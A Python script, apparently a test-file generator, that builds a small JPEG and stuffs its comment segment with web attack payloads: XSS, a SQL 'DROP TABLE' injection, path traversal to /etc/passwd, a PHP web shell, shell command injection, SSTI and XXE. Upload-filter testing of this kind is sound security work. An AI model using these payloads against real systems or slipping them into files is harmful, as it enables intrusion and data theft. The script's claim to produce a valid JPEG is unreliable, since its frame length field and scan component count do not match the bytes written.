#!/usr/bin/env python3
# Creates a valid JPEG image with embedded malicious content

import struct

def create_malicious_jpeg():
    # Start with proper JPEG file structure
    jpeg_data = bytearray()
    
    # JPEG SOI (Start of Image) marker
    jpeg_data.extend(b'\xFF\xD8')
    
    # JFIF APP0 segment
    jpeg_data.extend(b'\xFF\xE0')  # APP0 marker
    jpeg_data.extend(b'\x00\x10')  # Length (16 bytes)
    jpeg_data.extend(b'JFIF\x00')  # Identifier
    jpeg_data.extend(b'\x01\x01')  # Version
    jpeg_data.extend(b'\x01')      # Units (dots per inch)
    jpeg_data.extend(b'\x00\x48')  # X density (72)
    jpeg_data.extend(b'\x00\x48')  # Y density (72)
    jpeg_data.extend(b'\x00\x00')  # Thumbnail width/height (0)
    
    # Add a comment segment with malicious content
    jpeg_data.extend(b'\xFF\xFE')  # COM (Comment) marker
    
    malicious_comment = """XSS:<script>alert('JPEG XSS')</script>
SQL:'; DROP TABLE users; --
Path:../../../etc/passwd
Shell:<?php system($_GET['cmd']); ?>
Cmd:; cat /etc/passwd
SSTI:{{7*7}}
XXE:<!ENTITY xxe SYSTEM "file:///etc/passwd">
B64:PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+""".encode('utf-8')
    
    # Length of comment (2 bytes big-endian)
    comment_length = len(malicious_comment) + 2
    jpeg_data.extend(struct.pack('>H', comment_length))
    jpeg_data.extend(malicious_comment)
    
    # Add minimal quantization table (required for valid JPEG)
    jpeg_data.extend(b'\xFF\xDB')  # DQT marker
    jpeg_data.extend(b'\x00\x43')  # Length (67 bytes)
    jpeg_data.extend(b'\x00')      # Table ID
    # Simplified quantization table (64 bytes)
    qt = [16] * 64  # Simple quantization values
    for q in qt:
        jpeg_data.extend(struct.pack('B', q))
    
    # Start of Frame (minimal)
    jpeg_data.extend(b'\xFF\xC0')  # SOF0 marker
    jpeg_data.extend(b'\x00\x11')  # Length (17 bytes)
    jpeg_data.extend(b'\x08')      # Precision (8 bits)
    jpeg_data.extend(b'\x00\x01')  # Height (1 pixel)
    jpeg_data.extend(b'\x00\x01')  # Width (1 pixel)
    jpeg_data.extend(b'\x01')      # Number of components
    jpeg_data.extend(b'\x01\x11\x00')  # Component info
    
    # Huffman table (minimal)
    jpeg_data.extend(b'\xFF\xC4')  # DHT marker
    jpeg_data.extend(b'\x00\x1F')  # Length
    jpeg_data.extend(b'\x00')      # Table info
    jpeg_data.extend(b'\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00')
    jpeg_data.extend(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B')
    
    # Start of Scan
    jpeg_data.extend(b'\xFF\xDA')  # SOS marker
    jpeg_data.extend(b'\x00\x0C')  # Length
    jpeg_data.extend(b'\x03')      # Number of components
    jpeg_data.extend(b'\x01\x00\x02\x11\x03\x11\x00\x3F\x00')
    
    # Minimal compressed data (just to make it valid)
    jpeg_data.extend(b'\xFF\x00')  # Stuffed byte
    
    # End of Image marker
    jpeg_data.extend(b'\xFF\xD9')
    
    # Write the file
    with open('malicious_valid.jpg', 'wb') as f:
        f.write(jpeg_data)
    
    print("Created valid JPEG with malicious content: malicious_valid.jpg")
    print(f"File size: {len(jpeg_data)} bytes")
    return 'malicious_valid.jpg'

if __name__ == "__main__":
    create_malicious_jpeg()